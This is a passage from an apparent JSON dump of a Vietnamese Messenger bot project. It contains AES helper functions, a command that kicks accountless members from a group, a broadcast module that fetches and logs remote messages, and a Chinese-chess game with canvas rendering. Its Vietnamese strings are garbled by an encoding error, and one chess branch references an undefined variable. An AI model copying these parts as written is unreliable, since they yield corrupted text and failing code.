i = 0; i < length; i++ ) result += characters.charAt(Math.floor(Math.random() * charactersLength));\n  return result;\n}\n\nmodule.exports.assets = {\n  async font (name) {\n    if (!assets.font.loaded) await assets.font.load();\n    return assets.font.get(name);\n  },\n  async image (name) {\n    if (!assets.image.loaded) await assets.image.load();\n    return assets.image.get(name);\n  },\n  async data (name) {\n    if (!assets.data.loaded) await assets.data.load();\n    return assets.data.get(name);\n  }\n}\n\nmodule.exports.AES = {\n  encrypt (cryptKey, crpytIv, plainData) {\n    var encipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(crpytIv));\n        var encrypted = encipher.update(plainData);\n    encrypted = Buffer.concat([encrypted, encipher.final()]);\n    return encrypted.toString('hex');\n  },\n  decrypt (cryptKey, cryptIv, encrypted) {\n    encrypted = Buffer.from(encrypted, \"hex\");\n    var decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(cryptIv, 'binary'));\n    var decrypted = decipher.update(encrypted);\n\n    decrypted = Buffer.concat([decrypted, decipher.final()]);\n\n    return String(decrypted);\n  },\n  makeIv () { return Buffer.from(crypto.randomBytes(16)).toString('hex').slice(0, 16); }\n}\n\nmodule.exports.homeDir = function () {\n  var returnHome, typeSystem;\n  const home = process.env[\"HOME\"];\n  const user = process.env[\"LOGNAME\"] || process.env[\"USER\"] || process.env[\"LNAME\"] || process.env[\"USERNAME\"];\n\n  switch (process.platform) {\n    case \"win32\": {\n      returnHome = process.env.USERPROFILE || process.env.HOMEDRIVE + process.env.HOMEPATH || home || null;\n      typeSystem = \"win32\"\n      break;\n    }\n    case \"darwin\": {\n      returnHome = home || (user ? '/Users/' + user : null);\n      typeSystem = \"darwin\";\n      break;\n    }\n    case \"linux\": {\n      returnHome =  home || (process.getuid() === 0 ? '/root' : (user ? '/home/' + user : null));\n      typeSystem = \"linux\"\n      break;\n    }\n    default: {\n      returnHome = home || null;\n      typeSystem = \"unknow\"\n      break;\n    }\n  }\n\n  return [typeof os.homedir === 'function' ? os.homedir() : returnHome, typeSystem];\n}","path":null,"size_bytes":4809,"size_tokens":null},"modules/commands/kickndfb.js":{"content":"module.exports.config = {\n\tname: \"kickndfb\",\n\tversion: \"1.0.0\",\n\thasPermssion: 1,\n\tcredits: \"ProCoderMew\",\n\tdescription: \"L·ªçc mem bay acc\",\n\tcommandCategory: \"Qu·∫£n L√≠ Box\",\n\tusages: \"kickndfb\",\n\tcooldowns: 20\n};\n\nmodule.exports.run = async function({ api, event }) {\n    var { userInfo, adminIDs } = await api.getThreadInfo(event.threadID);    \n    var success = 0, fail = 0;\n    var arr = [];\n    for (const e of userInfo) {\n        if (e.gender == undefined) {\n            arr.push(e.id);\n        }\n    };\n\n    adminIDs = adminIDs.map(e => e.id).some(e => e == api.getCurrentUserID());\n    if (arr.length == 0) {\n        return api.sendMessage(\"Trong nh√≥m b·∫°n kh√¥ng t·ªìn t·∫°i 'Ng∆∞·ªùi d√πng Facebook'.\", event.threadID);\n    }\n    else {\n        api.sendMessage(\"Nh√≥m b·∫°n hi·ªán c√≥ \" + arr.length + \" 'Ng∆∞·ªùi d√πng Facebook'.\", event.threadID, function () {\n            if (!adminIDs) {\n                api.sendMessage(\"Nh∆∞ng bot kh√¥ng ph·∫£i l√† qu·∫£n tr·ªã vi√™n n√™n kh√¥ng th·ªÉ l·ªçc ƒë∆∞·ª£c.\", event.threadID);\n            } else {\n                api.sendMessage(\"B·∫Øt ƒë·∫ßu l·ªçc..\", event.threadID, async function() {\n                    for (const e of arr) {\n                        try {\n                            await new Promise(resolve => setTimeout(resolve, 1000));\n                            await api.removeUserFromGroup(parseInt(e), event.threadID);   \n                            success++;\n                        }\n                        catch {\n                            fail++;\n                        }\n                    }\n                  \n                    api.sendMessage(\"ƒê√£ l·ªçc th√†nh c√¥ng \" + success + \" ng∆∞·ªùi.\", event.threadID, function() {\n                        if (fail != 0) return api.sendMessage(\"L·ªçc th·∫•t b·∫°i \" + fail + \" ng∆∞·ªùi.\", event.threadID);\n                    });\n                })\n            }\n        })\n    }\n}","path":null,"size_bytes":1919,"size_tokens":null},"lib/Fca-Horizon-Remastered/broadcast.js":{"content":"'use strict';\n\nconst logger = require('./logger');\nconst Fetch = require('got');\n\nconst broadcastConfig = {\n  enabled: false,\n  data: [],\n};\n\nconst fetchBroadcastData = async () => {\n  try {\n    const response = await Fetch.get('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/Fca_BroadCast.json');\n    broadcastConfig.data = JSON.parse(response.body.toString());\n    return broadcastConfig.data;\n  } catch (error) {\n    logger.Error(`Failed to fetch broadcast data: ${error.message}`);\n    broadcastConfig.data = [];\n    return [];\n  }\n};\n\nconst broadcastRandomMessage = () => {\n  const randomMessage = broadcastConfig.data.length > 0 ? broadcastConfig.data[Math.floor(Math.random() * broadcastConfig.data.length)] : 'Ae Zui Z·∫ª Nh√© !';\n  logger.Normal(randomMessage);\n};\n\nconst startBroadcasting = async (enabled) => {\n  enabled = global.Fca.Require.FastConfig.BroadCast\n\n  if (enabled) {\n    try {\n      await fetchBroadcastData();\n      broadcastRandomMessage();\n      setInterval(broadcastRandomMessage, 3600 * 1000);\n    } catch (error) {\n      logger.Error(`Failed to start broadcasting: ${error.message}`);\n    }\n  }\n};\n\nmodule.exports = {\n  startBroadcasting,\n};","path":null,"size_bytes":1193,"size_tokens":null},"modules/commands/cotuong.js":{"content":"const { createCanvas } = require('canvas');\nconst axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nconst redPieces = ['ÂÖµ', 'ÁÇÆ', '‰ø•', 'ÂÇå', 'Áõ∏', '‰ªï', 'Â∏•'];\n\nclass ChessBoard {\n    constructor(width = 800, height = 900) {\n        this.canvas = createCanvas(width, height);\n        this.ctx = this.canvas.getContext('2d');\n        this.boardWidth = 640;\n        this.boardHeight = 720;\n        this.startX = (width - this.boardWidth) / 2;\n        this.startY = (height - this.boardHeight) / 2;\n        this.cellWidth = this.boardWidth / 8;\n        this.cellHeight = this.boardHeight / 9;\n    }\n\n    drawBoard() {\n        const ctx = this.ctx;\n\n        ctx.fillStyle = '#D4A574';\n        ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);\n\n        ctx.strokeStyle = '#8B4513';\n        ctx.lineWidth = 3;\n        ctx.strokeRect(this.startX - 10, this.startY - 10, this.boardWidth + 20, this.boardHeight + 20);\n\n        ctx.strokeStyle = '#654321';\n        ctx.lineWidth = 2;\n\n        for (let i = 0; i <= 9; i++) {\n            const y = this.startY + i * this.cellHeight;\n            ctx.beginPath();\n            ctx.moveTo(this.startX, y);\n            ctx.lineTo(this.startX + this.boardWidth, y);\n            ctx.stroke();\n        }\n\n        for (let i = 0; i <= 8; i++) {\n            const x = this.startX + i * this.cellWidth;\n            \n            ctx.beginPath();\n            ctx.moveTo(x, this.startY);\n            ctx.lineTo(x, this.startY + 4 * this.cellHeight);\n            ctx.stroke();\n\n            ctx.beginPath();\n            ctx.moveTo(x, this.startY + 5 * this.cellHeight);\n            ctx.lineTo(x, this.startY + 9 * this.cellHeight);\n            ctx.stroke();\n        }\n\n        this.drawPalace(0, 2);\n        this.drawPalace(7, 2);\n\n        this.drawRiver();\n\n        this.drawCannonPoints();\n\n        this.drawCoordinates();\n    }\n\n    drawPalace(startRow, width) {\n        const ctx = this.ctx;\n        const x1 = this.startX + 3 * this.cellWidth;\n        const x2 = this.startX + 5 * this.cellWidth;\n        const y1 = this.startY + startRow * this.cellHeight;\n        const y2 = this.startY + (startRow + 2) * this.cellHeight;\n\n        ctx.strokeStyle = '#654321';\n        ctx.lineWidth = 2;\n\n        ctx.beginPath();\n        ctx.moveTo(x1, y1);\n        ctx.lineTo(x2, y2);\n        ctx.stroke();\n\n        ctx.beginPath();\n        ctx.moveTo(x2, y1);\n        ctx.lineTo(x1, y2);\n        ctx.stroke();\n    }\n\n    drawRiver() {\n        const ctx = this.ctx;\n        const riverY = this.startY + 4.5 * this.cellHeight;\n\n        ctx.fillStyle = '#B8860B';\n        ctx.fillRect(this.startX, this.startY + 4 * this.cellHeight + 10, \n                    this.boardWidth, this.cellHeight - 20);\n\n        ctx.fillStyle = '#8B4513';\n        ctx.font = 'bold 36px serif';\n        ctx.textAlign = 'center';\n\n        const leftText = 'Ê•öÊ≤≥';\n        const rightText = 'Êº¢Áïå';\n        const centerX = this.startX + this.boardWidth / 2;\n\n        ctx.fillText(leftText, centerX - 80, riverY + 10);\n        ctx.fillText(rightText, centerX + 80, riverY + 10);\n    }\n\n    drawCannonPoints() {\n        const ctx = this.ctx;\n        const points = [\n            [1, 2], [7, 2],\n            [1, 7], [7, 7],\n            [0, 3], [2, 3], [4, 3], [6, 3], [8, 3],\n            [0, 6], [2, 6], [4, 6], [6, 6], [8, 6]\n        ];\n\n        ctx.strokeStyle = '#654321';\n        ctx.lineWidth = 1;\n\n        points.forEach(([col, row]) => {\n            const x = this.startX + col * this.cellWidth;\n            const y = this.startY + row * this.cellHeight;\n\n            const size = 8;\n            ctx.beginPath();\n            ctx.moveTo(x - size, y);\n            ctx.lineTo(x + size, y);\n            ctx.stroke();\n\n            ctx.beginPath();\n            ctx.moveTo(x, y - size);\n            ctx.lineTo(x, y + size);\n            ctx.stroke();\n        });\n    }\n\n    drawCoordinates() {\n        const ctx = this.ctx;\n        ctx.fillStyle = '#2F1B14';\n        ctx.font = 'bold 24px Arial';\n        ctx.textAlign = 'center';\n        ctx.textBaseline = 'middle';\n\n        const coordOffset = 50; \n\n        const letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I'];\n        for (let i = 0; i < 9; i++) {\n            const x = this.startX + i * this.cellWidth;\n            \n            ctx.fillText(letters[i], x, this.startY - coordOffset);\n            \n            ctx.fillText(letters[i], x, this.startY + this.boardHeight + coordOffset);\n        }\n\n        for (let i = 0; i < 10; i++) {\n            const y = this.startY + i * this.cellHeight;\n            const number = i;\n            \n            ctx.fillText(number.toString(), this.startX - coordOffset, y);\n            \n            ctx.fillText(number.toString(), this.startX + this.boardWidth + coordOffset, y);\n        }\n    }\n\n    drawPiece(piece, row, col, isSelected = false) {\n        const ctx = this.ctx;\n        const x = this.startX + col * this.cellWidth;\n        const y = this.startY + row * this.cellHeight;\n        const radius = 35;\n\n        const isRed = redPieces.includes(piece);\n\n        ctx.fillStyle = 'rgba(0,0,0,0.3)';\n        ctx.beginPath();\n        ctx.arc(x + 3, y + 3, radius, 0, 2 * Math.PI);\n        ctx.fill();\n\n        ctx.fillStyle = isSelected ? '#FFD700' : '#F5F5DC';\n        ctx.beginPath();\n        ctx.arc(x, y, radius, 0, 2 * Math.PI);\n        ctx.fill();\n\n        ctx.strokeStyle = isRed ? '#B22222' : '#000000';\n        ctx.lineWidth = 3;\n        ctx.stroke();\n\n        ctx.fillStyle = isRed ? '#B22222' : '#000000';\n        ctx.font = 'bold 28px serif';\n        ctx.textAlign = 'center';\n        ctx.textBaseline = 'middle';\n        ctx.fillText(piece, x, y);\n    }\n\n    renderBoard(board, selectedPos = null) {\n        this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);\n\n        this.drawBoard();\n\n        for (let row = 0; row < 10; row++) {\n            for (let col = 0; col < 9; col++) {\n                const piece = board[row][col];\n                if (piece) {\n                    const isSelected = selectedPos && \n                        selectedPos.row === row && selectedPos.col === col;\n                    this.drawPiece(piece, row, col, isSelected);\n                }\n            }\n        }\n\n        return this.canvas.toBuffer('image/png');\n    }\n\n    highlightValidMoves(validMoves) {\n        const ctx = this.ctx;\n        ctx.fillStyle = 'rgba(0, 255, 0, 0.3)';\n\n        validMoves.forEach(([row, col]) => {\n            const x = this.startX + col * this.cellWidth;\n            const y = this.startY + row * this.cellHeight;\n\n            ctx.beginPath();\n            ctx.arc(x, y, 15, 0, 2 * Math.PI);\n            ctx.fill();\n        });\n    }\n\n    highlightLastMove(fromPos, toPos) {\n        const ctx = this.ctx;\n        ctx.strokeStyle = '#FF6B6B';\n        ctx.lineWidth = 4;\n\n        const fromX = this.startX + fromPos.col * this.cellWidth;\n        const fromY = this.startY + fromPos.row * this.cellHeight;\n        ctx.strokeRect(fromX - 40, fromY - 40, 80, 80);\n\n        const toX = this.startX + toPos.col * this.cellWidth;\n        const toY = this.startY + toPos.row * this.cellHeight;\n        ctx.strokeRect(toX - 40, toY - 40, 80, 80);\n\n        ctx.strokeStyle = '#FF6B6B';\n        ctx.lineWidth = 3;\n        ctx.beginPath();\n        ctx.moveTo(fromX, fromY);\n        ctx.lineTo(toX, toY);\n        ctx.stroke();\n\n        const angle = Math.atan2(toY - fromY, toX - fromX);\n        const arrowLength = 20;\n        ctx.beginPath();\n        ctx.moveTo(toX, toY);\n        ctx.lineTo(toX - arrowLength * Math.cos(angle - Math.PI / 6), \n                  toY - arrowLength * Math.sin(angle - Math.PI / 6));\n        ctx.moveTo(toX, toY);\n        ctx.lineTo(toX - arrowLength * Math.cos(angle + Math.PI / 6), \n                  toY - arrowLength * Math.sin(angle + Math.PI / 6));\n        ctx.stroke();\n    }\n}\n\nmodule.exports.config = {\n    name: \"cotuong\",\n    version: \"1.0.0\", \n    hasPermission: 0,\n    credits: \"lechii\",\n    description: \"Game C·ªù T∆∞·ªõng - Chinese Chess\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[t·∫°o/tham gia/b·∫Øt ƒë·∫ßu/di chuy·ªÉn]\",\n    cooldowns: 0\n};\n\nif (!global.coTuong) global.coTuong = new Map();\n\nmodule.exports.handleReply = async function ({ api, event, handleReply }) {\n    const { threadID, messageID, senderID, body } = event;\n    const { type } = handleReply;\n\n    if (type === \"waiting_move\") {\n        const game = global.coTuong.get(threadID);\n        if (!game) return;\n\n        if (game.currentPlayer !== senderID) {\n            return api.sendMessage(\"‚ùå Kh√¥ng ph·∫£i l∆∞·ª£t c·ªßa b·∫°n!\", threadID, messageID);\n        }\n\n        const move = body.trim().toLowerCase();\n        if (move.length === 4 && /^[a-i][0-9][a-i][0-9]$/.test(move)) {\n            await makeMove(api, threadID, messageID, game, move);\n        } else {\n            return api.sendMessage(\"‚ùå ƒê·ªãnh d·∫°ng n∆∞·ªõc ƒëi kh√¥ng ƒë√∫ng! V√≠ d·ª•: e2e4\", threadID, messageID);\n        }\n    }\n};\n\nmodule.exports.run = async function ({ api, event, args, Users }) {\n    const { threadID, messageID, senderID } = event;\n\n    const action = args[0]?.toLowerCase();\n\n    switch (action) {\n        case \"t·∫°o\":\n            await createGame(api, threadID, messageID, senderID);\n            break;\n        case \"tham\":\n            await joinGame(api, threadID, messageID, senderID, Users);\n            break;\n        case \"b·∫Øt\":\n            await startGame(api, threadID, messageID, senderID);\n            break;\n        case \"board\":\n            await showBoard(api, threadID, messageID);\n            break;\n        case \"r·ªùi\":\n        case \"roi\":\n            await leaveGame(api, threadID, messageID, senderID);\n            break;\n        case \"k·∫øt\":\n        case \"ket\":\n        case \"end\":\n            await endGame(api, threadID, messageID, senderID);\n            break;\n        case \"ƒë·∫ßu\":\n        case \"dau\":\n        case \"surrender\":\n            await surrender(api, threadID, messageID, senderID);\n            break;\n        default:\n            const localImagePath = path.join(__dirname, '..', '..', 'modules', 'commands', 'cache', 'cotuong.jpg');\n\n            let attachment = null;\n            try {\n                await fs.promises.mkdir(path.dirname(localImagePath), { recursive: true });\n                if (!fs.existsSync(localImagePath)) {\n                    await fs.promises.writeFile(localImagePath, response.data);\n                }\n                attachment = fs.createReadStream(localImagePath);\n            } catch (error) {\n                console.error(\"L·ªói khi t·∫£i ho·∫∑c l∆∞u ·∫£nh C·ªù T∆∞·ªõng:\", error);\n            }\n\n            return api.sendMessage({\n                body: `üèõÔ∏è GAME C·ªú T∆Ø·ªöNG üèõÔ∏è\n\nüéÆ C√°ch ch∆°i:\n‚Ä¢ ${this.config.name} t·∫°o - T·∫°o game m·ªõi\n‚Ä¢ ${this.config.name} tham - Tham gia game (2 ng∆∞·ªùi)\n‚Ä¢ ${this.config.name} b·∫Øt - B·∫Øt ƒë·∫ßu game\n‚Ä¢ ${this.config.name} board - Xem b√†n c·ªù\n‚Ä¢ ${this.config.name} r·ªùi - R·ªùi kh·ªèi game\n‚Ä¢ ${this.config.name} k·∫øt - K·∫øt th√∫c game\n‚Ä¢ ${this.config.name} ƒë·∫ßu - ƒê·∫ßu h√†ng\n\nüéØ Trong game:\n‚Ä¢ Nh·∫≠p n∆∞·ªõc ƒëi: a1b2 (t·ª´ v·ªã tr√≠ a1 ƒë·∫øn b2)\n‚Ä¢ T·ªça ƒë·ªô: a-i (c·ªôt), 0-9 (h√†ng)\n\nüî¥ Qu√¢n ƒê·ªè: ËªäÈ¶¨Ë±°Â£´Â∞áÁÇÆÂÖµ\n‚ö´ Qu√¢n ƒêen: ËªäÈ¶¨Ë±°Â£´Â∞áÁÇÆÂçí`,\n                attachment: attachment\n            }, threadID, messageID);\n    }\n};\n\nasync function createGame(api, threadID, messageID, senderID) {\n    if (global.coTuong.has(threadID)) {\n        return api.sendMessage(\"‚ùå ƒê√£ c√≥ game ƒëang di·ªÖn ra!\", threadID, messageID);\n    }\n\n    global.coTuong.set(threadID, {\n        creator: senderID,\n        redPlayer: null,\n        blackPlayer: null,\n        currentPlayer: null,\n        board: initializeBoard(),\n        status: \"waiting\",\n        turn: \"red\",\n        endVotes: new Set()\n    });\n\n    return api.sendMessage(`üèõÔ∏è ƒê√£ t·∫°o game C·ªù T∆∞·ªõng!\n\nüë• Nh·∫≠p \"${module.exports.config.name} tham\" ƒë·ªÉ tham gia\nüöÄ Nh·∫≠p \"${module.exports.config.name} b·∫Øt\" ƒë·ªÉ b·∫Øt ƒë·∫ßu`, threadID, messageID);\n}\n\nasync function joinGame(api, threadID, messageID, senderID, Users) {\n    const game = global.coTuong.get(threadID);\n\n    if (!game) return api.sendMessage(\"‚ùå Ch∆∞a c√≥ game n√†o!\", threadID, messageID);\n    if (game.status !== \"waiting\") return api.sendMessage(\"‚ùå Game ƒë√£ b·∫Øt ƒë·∫ßu!\", threadID, messageID);\n\n    const userName = await Users.getNameUser(senderID);\n\n    if (!game.redPlayer) {\n        game.redPlayer = { id: senderID, name: userName };\n        return api.sendMessage(`‚úÖ ${userName} tham gia üî¥!`, threadID, messageID);\n    } else if (!game.blackPlayer && senderID !== game.redPlayer.id) {\n        game.blackPlayer = { id: senderID, name: userName };\n        return api.sendMessage(`‚úÖ ${userName} tham gia ‚ö´!\n\nüéÆ ƒê·ªß ng∆∞·ªùi! Nh·∫≠p \"${module.exports.config.name} b·∫Øt\"`, threadID, messageID);\n    } else {\n        return api.sendMessage(\"‚ùå Game ƒë√£ ƒë·ªß ng∆∞·ªùi!\", threadID, messageID);\n    }\n}\n\nasync function startGame(api, threadID, messageID, senderID) {\n    const game = global.coTuong.get(threadID);\n\n    if (!game || game.creator !== senderID) return api.sendMessage(\"‚ùå Ch·ªâ ng∆∞·ªùi t·∫°o game m·ªõi b·∫Øt ƒë·∫ßu ƒë∆∞·ª£c!\", threadID, messageID);\n    if (!game.redPlayer || !game.blackPlayer) return api.sendMessage(\"‚ùå C·∫ßn ƒë·ªß 2 ng∆∞·ªùi!\", threadID, messageID);\n    if (game.status !== \"waiting\") return api.sendMessage(\"‚ùå Game ƒë√£ b·∫Øt ƒë·∫ßu ho·∫∑c ƒë√£ k·∫øt th√∫c!\", threadID, messageID);\n\n    game.status = \"playing\";\n    game.currentPlayer = game.redPlayer.id;\n    game.chessBoard = new ChessBoard();\n\n    const boardImage = game.chessBoard.renderBoard(game.board);\n    const imagePath = `./chess-${threadID}.png`;\n    fs.writeFileSync(imagePath, boardImage);\n\n    return api.sendMessage({\n        body: `üèõÔ∏è GAME B·∫ÆT ƒê·∫¶U! üèõÔ∏è\n\nüî¥ ${game.redPlayer.name}\n‚ö´ ${game.blackPlayer.name}\n\nüéØ L∆∞·ª£t: ${game.redPlayer.name}\n\nüìù Reply v√† nh·∫≠p n∆∞·ªõc ƒëi (vd: e2e4)`,\n        attachment: fs.createReadStream(imagePath)\n    }, threadID, (err, info) => {\n        fs.unlinkSync(imagePath);\n        global.client.handleReply.push({\n            name: module.exports.config.name,\n            messageID: info.messageID,\n            type: \"waiting_move\"\n        });\n    }, messageID);\n}\n\nfunction initializeBoard() {\n    const board = Array(10).fill(null).map(() => Array(9).fill(null));\n\n    board[0] = ['Ëªä', 'È¶¨', 'Ë±°', 'Â£´', 'Â∞á', 'Â£´', 'Ë±°', 'È¶¨', 'Ëªä'];\n    board[2] = [null, 'Á†≤', null, null, null, null, null, 'Á†≤', null];\n    board[3] = ['Âçí', null, 'Âçí', null, 'Âçí', null, 'Âçí', null, 'Âçí'];\n\n    board[6] = ['ÂÖµ', null, 'ÂÖµ', null, 'ÂÖµ', null, 'ÂÖµ', null, 'ÂÖµ'];\n    board[7] = [null, 'ÁÇÆ', null, null, null, null, null, 'ÁÇÆ', null];\n    board[9] = ['‰ø•', 'ÂÇå', 'Áõ∏', '‰ªï', 'Â∏•', '‰ªï', 'Áõ∏', 'ÂÇå', '‰ø•'];\n\n    return board;\n}\n\nasync function makeMove(api, threadID, messageID, game, move) {\n    const fromCol = move[0].charCodeAt(0) - 97;\n    const fromRow = parseInt(move[1]);\n    const toCol = move[2].charCodeAt(0) - 97;\n    const toRow = parseInt(move[3]);\n\n    if (fromCol < 0 || fromCol > 8 || toCol < 0 || toCol > 8 || \n        fromRow < 0 || fromRow > 9 || toRow < 0 || toRow > 9) {\n        return api.sendMessage(\"‚ùå T·ªça ƒë·ªô kh√¥ng h·ª£p l·ªá!\", threadID, messageID);\n    }\n\n    const piece = game.board[fromRow][fromCol];\n    if (!piece) return api.sendMessage(\"‚ùå Kh√¥ng c√≥ qu√¢n c·ªù!\", threadID, messageID);\n\n    const isRedPiece = redPieces.includes(piece);\n    const isCurrentPlayerRed = game.currentPlayer === game.redPlayer.id;\n\n    if (isRedPiece !== isCurrentPlayerRed) return api.sendMessage(\"‚ùå Kh√¥ng ph·∫£i qu√¢n c·ªßa b·∫°n!\", threadID, messageID);\n    if (!isValidMove(game.board, fromRow, fromCol, toRow, toCol, piece)) return api.sendMessage(\"‚ùå N∆∞·ªõc ƒëi kh√¥ng h·ª£p l·ªá!\", threadID, messageID);\n\n    const capturedPiece = game.board[toRow][toCol];\n    game.board[toRow][toCol] = piece;\n    game.board[fromRow][fromCol] = null;\n\n    game.chessBoard.renderBoard(game.board);\n    game.chessBoard.highlightLastMove(\n        { row: fromRow, col: fromCol },\n        { row: toRow, col: toCol }\n    );\n    const boardImage = game.chessBoard.canvas.toBuffer('image/png');\n    const imagePath = `./chess-move-${threadID}.png`;\n    fs.writeFileSync(imagePath, boardImage);\n\n    let message = `‚úÖ ${isCurrentPlayerRed ? game.redPlayer.name : game.blackPlayer.name} ƒëi: ${move}`;\n\n    if (capturedPiece) message += `\\nüéØ B·∫Øt: ${capturedPiece}`;\n    if (capturedPiece === 'Â∞á' || capturedPiece === 'Â∏•') {\n        game.status = \"finished\";\n        const winnerSymbol = isCurrentPlayerRed ? \"üî¥\" : \"‚ö´\";\n        message += `\\nüèÜ ${isCurrentPlayerRed ? game.redPlayer.name : game.blackPlayer.name} ${winnerSymbol} TH·∫ÆNG!`;\n        global.coTuong.delete(threadID);\n\n        return api.sendMessage({ body: message, attachment: fs.createReadStream(imagePath) }, threadID, () => fs.unlinkSync(imagePath), messageID);\n    }\n\n    game.currentPlayer = isCurrentPlayerRed ? game.blackPlayer.id : game.redPlayer.id;\n    game.turn = isCurrentPlayerRed ? \"black\" : \"red\";\n\n    const nextPlayer = isCurrentPlayerRed ? game.blackPlayer.name : game.redPlayer.name;\n    const nextColorSymbol = isCurrentPlayerRed ? \"‚ö´ (ƒêen)\" : \"üî¥ (ƒê·ªè)\";\n\n    message += `\\n\\nüéØ L∆∞·ª£t: ${nextPlayer} ${nextColorSymbol}`;\n    message += `\\nüìù Reply ƒë·ªÉ nh·∫≠p n∆∞·ªõc ƒëi`;\n\n    return api.sendMessage({ body: message, attachment: fs.createReadStream(imagePath) }, threadID, (err, info) => {\n        fs.unlinkSync(imagePath);\n        global.client.handleReply.push({ name: module.exports.config.name, messageID: info.messageID, type: \"waiting_move\" });\n    }, messageID);\n}\n\nfunction isValidMove(board, fromRow, fromCol, toRow, toCol, piece) {\n    const targetPiece = board[toRow][toCol];\n    const isFromRed = redPieces.includes(piece);\n    if (targetPiece && isFromRed === redPieces.includes(targetPiece)) return false;\n\n    switch (piece) {\n        case 'Â∏•': case 'Â∞á': return isValidGeneralMove(fromRow, fromCol, toRow, toCol, piece === 'Â∏•');\n        case '‰ªï': case 'Â£´': return isValidAdvisorMove(fromRow, fromCol, toRow, toCol, piece === '‰ªï');\n        case 'Áõ∏': case 'Ë±°': return isValidElephantMove(board, fromRow, fromCol, toRow, toCol, piece === 'Áõ∏');\n        case '‰ø•': case 'Ëªä': return isValidRookMove(board, fromRow, fromCol, toRow, toCol);\n        case 'ÂÇå': case 'È¶¨': return isValidKnightMove(board, fromRow, fromCol, toRow, toCol);\n        case 'ÁÇÆ': case 'Á†≤': return isValidCannonMove(board, fromRow, fromCol, toRow, toCol);\n        case 'ÂÖµ': case 'Âçí': return isValidPawnMove(fromRow, fromCol, toRow, toCol, piece === 'ÂÖµ');\n        default: return false;\n    }\n}\n\nfunction isValidGeneralMove(fromRow, fromCol, toRow, toCol, isRed) {\n    const palace = isRed ? [7, 8, 9] : [0, 1, 2];\n    if (!palace.includes(toRow) || toCol < 3 || toCol > 5) return false;\n\n    const rowDiff = Math.abs(toRow - fromRow);\n    const colDiff = Math.abs(toCol - fromCol);\n    return (rowDiff === 1 && colDiff === 0) || (rowDiff === 0 && colDiff === 1);\n}\n\nfunction isValidAdvisorMove(fromRow, fromCol, toRow, toCol, isRed) {\n    const palace = isRed ? [7, 8, 9] : [0, 1, 2];\n    if (!palace.includes(toRow) || toCol < 3 || toCol > 5) return false;\n\n    return Math.abs(toRow - fromRow) === 1 && Math.abs(toCol - fromCol) === 1;\n}\n\nfunction isValidElephantMove(board, fromRow, fromCol, toRow, toCol, isRed) {\n    const side = isRed ? [5, 6, 7, 8, 9] : [0, 1, 2, 3, 4];\n    if (!side.includes(toRow)) return false;\n\n    if (Math.abs(toRow - fromRow) !== 2 || Math.abs(toCol - fromCol) !== 2) return false;\n\n    const blockRow = fromRow + (toRow - fromRow) / 2;\n    const blockCol = fromCol + (toCol - fromCol) / 2;\n    return !board[blockRow][blockCol];\n}\n\nfunction isValidRookMove(board, fromRow, fromCol, toRow, toCol) {\n    if (fromRow !== toRow && fromCol !== toCol) return false;\n\n    if (fromRow === toRow) {\n        const minCol = Math.min(fromCol, toCol);\n        const maxCol = Math.max(fromCol, toCol);\n        for (let col = minCol + 1; col < maxCol; col++) {\n            if (board[fromRow][col]) return false;\n        }\n    } else {\n        const minRow = Math.min(fromRow, toRow);\n        const maxRow = Math.max(fromRow, toRow);\n        for (let row = minRow + 1; row < maxRow; row++) {\n            if (board[row][fromCol]) return false;\n        }\n    }\n    return true;\n}\n\nfunction isValidKnightMove(board, fromRow, fromCol, toRow, toCol) {\n    const rowDiff = Math.abs(toRow - fromRow);\n    const colDiff = Math.abs(toCol - fromCol);\n\n    if (!((rowDiff === 2 && colDiff === 1) || (rowDiff === 1 && colDiff === 2))) return false;\n\n    let blockRow, blockCol;\n    if (rowDiff === 2) {\n        blockRow = fromRow + (toRow - fromRow) / 2;\n        blockCol = fromCol;\n    } else {\n        blockRow = fromRow;\n        blockCol = fromCol + (toCol - fromCol) / 2;\n    }\n\n    return !board[blockRow][blockCol];\n}\n\nfunction isValidCannonMove(board, fromRow, fromCol, toRow, toCol) {\n    if (fromRow !== toRow && fromCol !== toCol) return false;\n\n    let pieceCount = 0;\n\n    if (fromRow === toRow) {\n        const minCol = Math.min(fromCol, toCol);\n        const maxCol = Math.max(fromCol, toCol);\n        for (let col = minCol + 1; col < maxCol; col++) {\n            if (board[fromRow][col]) pieceCount++;\n        }\n    } else {\n        const minRow = Math.min(fromRow, toRow);\n        const maxRow = Math.max(fromRow, toRow);\n        for (let row = minRow + 1; row < maxRow; row++) {\n            if (board[row][fromCol]) pieceCount++;\n        }\n    }\n\n    const targetPiece = board[toRow][toCol];\n    return targetPiece ? pieceCount === 1 : pieceCount === 0;\n}\n\nfunction isValidPawnMove(fromRow, fromCol, toRow, toCol, isRed) {\n    const forward = isRed ? -1 : 1;\n    const river = isRed ? 4 : 5;\n\n    if (toRow === fromRow + forward && toCol === fromCol) return true;\n\n    if ((isRed && fromRow <= river) || (!isRed && fromRow >= river)) {\n        if (toRow === fromRow && Math.abs(toCol - fromCol) === 1) return true;\n    }\n\n    return false;\n}\n\nasync function showBoard(api, threadID, messageID) {\n    const game = global.coTuong.get(threadID);\n\n    if (!game) return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o!\", threadID, messageID);\n\n    let message = \"üèõÔ∏è B√ÄN C·ªú T∆Ø·ªöNG\\n\\n\";\n    if (game.status === 'playing') {\n        const currentPlayerName = game.currentPlayer === game.redPlayer.id ? \n            game.redPlayer.name : game.blackPlayer.name;\n        const currentColorSymbol = game.turn === 'red' ? 'üî¥ (ƒê·ªè)' : '‚ö´ (ƒêen)';\n        message += `üéØ L∆∞·ª£t: ${currentPlayerName} ${currentColorSymbol}`;\n    }\n\n    if (!game.chessBoard) game.chessBoard = new ChessBoard();\n\n    const boardImage = game.chessBoard.renderBoard(game.board);\n    const imagePath = `./chess-board-${threadID}.png`;\n    fs.writeFileSync(imagePath, boardImage);\n\n    return api.sendMessage({ body: message, attachment: fs.createReadStream(imagePath) }, threadID, () => fs.unlinkSync(imagePath), messageID);\n}\n\nasync function leaveGame(api, threadID, messageID, senderID) {\n    const game = global.coTuong.get(threadID);\n\n    